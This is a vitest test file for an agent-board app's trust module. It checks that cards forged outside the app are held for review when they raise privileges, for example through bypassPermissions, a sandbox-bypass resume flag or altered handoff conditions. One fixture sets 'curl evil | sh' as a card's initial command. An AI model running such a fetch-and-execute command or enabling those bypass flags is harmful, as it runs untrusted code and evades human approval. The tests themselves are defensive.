import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { diffPrivileges, isTrustedLine, privilegeView, revertPrivileges, trustedIncoming } from '../src/shared/board-trust'
import { BoardTrust } from '../src/main/board-trust'
import { onBoardWritten, readWorkspace, saveLedger, saveWorkspace, WORKSPACE_FILE } from '../src/main/workspace-store'
import type { NodeData, Workspace } from '../src/shared/types'

const node = (id: string, data: Partial<NodeData>) => ({ id, position: { x: 0, y: 0 }, data: { kind: 'claude', title: id, cwd: 'C:/p', ...data } as NodeData })
const views = (...ns: ReturnType<typeof node>[]) => Object.fromEntries(ns.map((n) => [n.id, privilegeView(n.data, n.id, [])]))

describe('diffPrivileges', () => {
  it('holds a known card whose launch fields changed, not one whose title or layout changed', () => {
    const held = diffPrivileges(views(node('a', {}), node('b', {})), [node('a', { title: 'renamed' }), node('b', { claude: { boardTools: true, permissionMode: 'bypassPermissions' } })])
    expect(held.map((h) => h.nodeId)).toEqual(['b'])
    expect(held[0].changes.map((c) => c.field).sort()).toEqual(['claude.boardTools', 'claude.permissionMode'])
  })
  it('holds a new card only when it raises rights (role and resume count)', () => {
    const held = diffPrivileges({}, [
      node('plain', { engine: 'codex', parentId: 'x' }),
      node('cmd', { kind: 'terminal', initialCommand: 'curl evil | sh' }),
      node('chief', { kind: 'conductor' }),
      node('roled', { role: 'security-engineer' }),
      node('resumer', { claude: { resume: '--dangerously-bypass-approvals-and-sandbox' } })
    ])
    expect(held.map((h) => h.nodeId).sort()).toEqual(['chief', 'cmd', 'resumer', 'roled'])
  })
  it('holds the target of a handoff line added outside the app', () => {
    const before = views(node('w', {}), node('chief', { kind: 'conductor' }))
    const edges = [{ source: 'w', target: 'chief', data: { mode: 'auto', template: 'run {{output}}' } }]
    const held = diffPrivileges(before, [node('w', {}), node('chief', { kind: 'conductor' })], edges)
    expect(held.map((h) => [h.nodeId, h.changes[0].field])).toEqual([['chief', 'handoffs']])
  })
  it('holds the target of a line whose condition was added, removed or changed outside the app', () => {
    const cards = [node('tester', {}), node('ops', {})]
    const line = (condition?: unknown) => [{ source: 'tester', target: 'ops', data: { mode: 'auto', template: 'deploy', condition } }]
    const trusted = (condition?: string) => Object.fromEntries(cards.map((n) => [n.id, privilegeView(n.data, n.id, line(condition))]))
    const heldFor = (was: string | undefined, is: unknown) => diffPrivileges(trusted(was), cards, line(is) as never).map((h) => [h.nodeId, h.changes[0].field])
    expect(heldFor('PASS', undefined)).toEqual([['ops', 'handoffs']]) // the gate is gone: the line now fires on every reply
    expect(heldFor('PASS', '/PASS|FAIL/')).toEqual([['ops', 'handoffs']])
    expect(heldFor(undefined, '/(a+)+$/')).toEqual([['ops', 'handoffs']])
    // not text: a change, whatever it would read as (such a value makes the line throw when it is used)
    // an object whose toString is not a function throws when it is turned into text: it must be held, not thrown on
    for (const [was, forged] of [['PASS', 5], ['PASS', ['PASS']], [undefined, []], ['5', 5], ['["PASS"]', ['PASS']], [undefined, false], ['PASS', { toString: 1 }], [undefined, { toString: 1 }]] as const) {
      expect(heldFor(was, forged), JSON.stringify(forged)).toEqual([['ops', 'handoffs']])
    }
    // the condition is trimmed before it is used, so spaces around it change nothing
    expect(heldFor('PASS', '  PASS ')).toEqual([])
    expect(heldFor(undefined, '   ')).toEqual([])
    expect(heldFor('PASS', 'PASS')).toEqual([])
  })
  it('compares a view saved before lines carried their condition without it', () => {
    const cards = [node('s', {}), node('s2', {}), node('t', {})]
    const edges = (template: string) => [
      { source: 's2', target: 't', data: { mode: 'auto', template: 'x', condition: 'FAIL' } },
      { source: 's', target: 't', data: { mode: 'auto', template: 'xy' } },
      { source: 's', target: 't', data: { mode: 'auto', template, condition: '/PASS/' } }
    ]
    // what the record holds for a board saved by an older version: the lines as that version listed and sorted them
    const oldLines = edges('x')
      .map((e) => ({ from: e.source, mode: e.data.mode, template: e.data.template }))
      .sort((a, b) => (a.from + a.mode + a.template).localeCompare(b.from + b.mode + b.template))
    const legacy = { ...views(...cards), t: { ...privilegeView(cards[2].data, 't', []), handoffs: JSON.stringify(oldLines) } }
    expect(diffPrivileges(legacy, cards, edges('x'))).toEqual([])
    expect(diffPrivileges(legacy, cards, edges('y')).map((h) => h.nodeId)).toEqual(['t'])
    expect(diffPrivileges(legacy, cards, edges('x').slice(1)).map((h) => h.nodeId)).toEqual(['t'])
  })
  it('treats empty values as unset and survives a card with no data', () => {
    expect(diffPrivileges(views(node('a', {})), [node('a', { claude: { extraArgs: [], mcpServers: {}, boardTools: false } })])).toEqual([])
    expect(() => diffPrivileges({}, [{ id: 'z', data: null }])).not.toThrow()
  })
})

describe('revertPrivileges', () => {
  it('puts the trusted values back and drops forged ones', () => {
    const trusted = privilegeView(node('a', { claude: { permissionMode: 'default', model: 'opus' } as NodeData['claude'] }).data, 'a', [])
    const forged = node('a', { claude: { permissionMode: 'bypassPermissions', extraArgs: ['--x'], model: 'opus', resume: 'evil' } as NodeData['claude'], initialCommand: 'x' }).data
    const out = revertPrivileges(forged, trusted)
    expect(out.claude).toEqual({ permissionMode: 'default', model: 'opus' })
    expect(out.initialCommand).toBeUndefined()
    expect(diffPrivileges({ a: trusted }, [{ id: 'a', data: out }])).toEqual([])
  })
  it('lists the trusted incoming lines', () => {
    const v = privilegeView(node('t', {}).data, 't', [{ source: 's', target: 't', data: { mode: 'manual', template: 'x' } }])
    expect(trustedIncoming(v)).toEqual([{ from: 's', mode: 'manual', template: 'x', condition: '' }])
    expect(trustedIncoming({})).toEqual([])
  })
  it('Revert keeps a line only when its condition is the trusted one', () => {
    const edge = (condition?: string) => ({ source: 's', target: 't', data: { mode: 'auto', template: 'x', condition } })
    const v = privilegeView(node('t', {}).data, 't', [edge('PASS')])
    expect(isTrustedLine(v, edge('PASS'))).toBe(true)
    expect(isTrustedLine(v, edge(' PASS '))).toBe(true)
    expect(isTrustedLine(v, edge())).toBe(false)
    expect(isTrustedLine(v, edge('/./'))).toBe(false)
    expect(isTrustedLine(v, edge(['PASS'] as never))).toBe(false)
    expect(isTrustedLine(v, edge({ toString: 1 } as never))).toBe(false) // Revert must not throw half way
    expect(isTrustedLine(v, { ...edge('PASS'), source: 'other' })).toBe(false)
    // a view saved before lines carried their condition cannot tell: the line stays
    const legacy = { handoffs: JSON.stringify([{ from: 's', mode: 'auto', template: 'x' }]) }
    expect(isTrustedLine(legacy, edge('PASS'))).toBe(true)
    expect(isTrustedLine(legacy, { ...edge('PASS'), data: { mode: 'auto', template: 'y' } })).toBe(false)
    expect(isTrustedLine({}, edge())).toBe(false)
  })
})

describe('BoardTrust with the board file', () => {
  let dir: string
  let trust: BoardTrust
  const recFile = (): string => join(dir, 'userData', 'board-trust.json')
  const file = (): string => join(dir, WORKSPACE_FILE)
  const ws = (nodes: ReturnType<typeof node>[]): Workspace => ({ version: 1, projectRoot: dir, nodes, edges: [] })
  const open = (known = true, t = trust) => t.check(dir, readWorkspace(dir)!.text, known).map((h) => h.nodeId)
  const forge = (mut: (w: Workspace) => void): void => {
    const w = JSON.parse(readFileSync(file(), 'utf8')) as Workspace
    mut(w)
    writeFileSync(file(), JSON.stringify(w, null, 2))
  }
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'ob-trust-'))
    trust = new BoardTrust(recFile())
    onBoardWritten((root, text, fromDisk) => trust.record(root, text, { fromDisk }))
  })
  afterEach(() => {
    onBoardWritten(undefined)
    rmSync(dir, { recursive: true, force: true })
  })

  it('trusts a board the app wrote, and an unrecorded board in a folder opened before', () => {
    saveWorkspace(ws([node('a', { claude: { boardTools: true } })]))
    expect(open()).toEqual([])
    expect(open(true, new BoardTrust(join(dir, 'other.json')))).toEqual([])
  })

  it('checks an unrecorded board in a folder never opened as all-new (a cloned repo)', () => {
    writeFileSync(file(), JSON.stringify(ws([node('a', {}), node('b', { claude: { permissionMode: 'bypassPermissions' } })])))
    expect(open(false)).toEqual(['b'])
    // still held after an app save and in a fresh process
    saveWorkspace(readWorkspace(dir)!.workspace)
    expect(open(false, new BoardTrust(recFile()))).toEqual(['b'])
  })

  it('holds a card edited outside the app, through an app save and a fresh process', () => {
    saveWorkspace(ws([node('a', {}), node('b', {})]))
    expect(open()).toEqual([])
    forge((w) => {
      w.nodes[1].data.claude = { boardTools: true }
    })
    expect(open()).toEqual(['b'])
    expect(trust.isHeld(dir, 'b')).toBe(true)
    saveWorkspace(readWorkspace(dir)!.workspace) // the renderer autosaves the forged data while it is held
    expect(open()).toEqual(['b'])
    expect(open(true, new BoardTrust(recFile()))).toEqual(['b'])
  })

  it('a ledger write does not launder an edit made while the app runs', () => {
    saveWorkspace(ws([node('a', {})]))
    expect(open()).toEqual([])
    forge((w) => {
      w.nodes[0].data.claude = { permissionMode: 'bypassPermissions' }
    })
    saveLedger(dir, { tasks: [], nextTaskId: 2 }) // a card claims a task: the ledger re-reads the forged file
    expect(open(true, new BoardTrust(recFile()))).toEqual(['a'])
  })

  it('holds the target of a line whose condition was dropped in the file, through a ledger write and a fresh process', () => {
    const gated = { id: 'e1', source: 'a', target: 'b', data: { mode: 'auto' as const, template: 'deploy', condition: '/\\bPASS\\b/' } }
    saveWorkspace({ ...ws([node('a', {}), node('b', {})]), edges: [gated] })
    expect(open()).toEqual([])
    saveLedger(dir, { tasks: [], nextTaskId: 2 })
    expect(open(true, new BoardTrust(recFile()))).toEqual([])
    forge((w) => {
      delete w.edges[0].data.condition
    })
    saveLedger(dir, { tasks: [], nextTaskId: 3 })
    expect(open(true, new BoardTrust(recFile()))).toEqual(['b'])
  })

  it('holds only the line target when a forged condition is not text, and an app save of that file still records', () => {
    const gated = { id: 'e1', source: 'a', target: 'b', data: { mode: 'auto' as const, template: 'deploy', condition: 'PASS' } }
    saveWorkspace({ ...ws([node('a', {}), node('b', {})]), edges: [gated] })
    forge((w) => {
      ;(w.edges[0].data as Record<string, unknown>).condition = { toString: 1 }
    })
    expect(open()).toEqual(['b']) // compared, not the hold-everything fallback of a check that threw
    expect(() => saveWorkspace(readWorkspace(dir)!.workspace)).not.toThrow()
    expect(open(true, new BoardTrust(recFile()))).toEqual(['b'])
  })

  it('a ledger write of an untouched board keeps it trusted', () => {
    saveWorkspace(ws([node('a', {})]))
    saveLedger(dir, { tasks: [], nextTaskId: 5 })
    expect(open(true, new BoardTrust(recFile()))).toEqual([])
  })

  it('holds every card when the board cannot be read as expected', () => {
    saveWorkspace(ws([node('a', {})]))
    expect(trust.check(dir, '{not json', true).map((h) => h.nodeId)).toEqual([])
    writeFileSync(file(), JSON.stringify({ version: 1, nodes: [{ id: 'a', data: { kind: 'claude', title: 'a', cwd: 'C:/p', claude: { boardTools: true } } }], edges: [] }))
    expect(open()).toEqual(['a'])
  })

  it('Trust records the change; Revert keeps the trusted view until the renderer saves', () => {
    saveWorkspace(ws([node('a', {}), node('b', {})]))
    open()
    forge((w) => {
      w.nodes[0].data.initialCommand = 'echo hi'
      w.nodes[1].data.initialCommand = 'echo forged'
    })
    expect(open()).toEqual(['a', 'b'])
    trust.release(dir, ['a'], false, readFileSync(file(), 'utf8'))
    const v = trust.release(dir, ['b'], true, readFileSync(file(), 'utf8'))
    expect(v.b.initialCommand).toBeNull()
    // quit before the renderer saved the revert: b is held again, a is trusted
    expect(open(true, new BoardTrust(recFile()))).toEqual(['b'])
  })
})

describe('the WSL switch', () => {
  it('is a privilege field: turning the sandbox off outside the app holds the card', () => {
    expect(privilegeView({ kind: 'claude', claude: { wsl: true } })['claude.wsl']).toBe('true')
    expect(privilegeView({ kind: 'claude', claude: {} })['claude.wsl'] ?? null).toBeNull()
  })
  it('counts the light MCP switch: turning it off outside the app holds a known card, a new light card is not held for it', () => {
    expect(privilegeView({ kind: 'claude', claude: { lightMcp: true } })['claude.lightMcp']).toBe('true')
    expect(privilegeView({ kind: 'claude', claude: {} })['claude.lightMcp'] ?? null).toBeNull()
    const held = diffPrivileges(views(node('a', { claude: { lightMcp: true } })), [node('a', {}), node('fresh', { claude: { lightMcp: true } })])
    expect(held.map((h) => h.nodeId)).toEqual(['a'])
    expect(held[0].changes.map((c) => c.field)).toEqual(['claude.lightMcp'])
  })
  it('counts the effort level too, like the model', () => {
    expect(privilegeView({ kind: 'claude', claude: { effort: 'max' } })['claude.effort']).toBe('"max"')
    expect(privilegeView({ kind: 'claude', claude: {} })['claude.effort'] ?? null).toBeNull()
  })
})
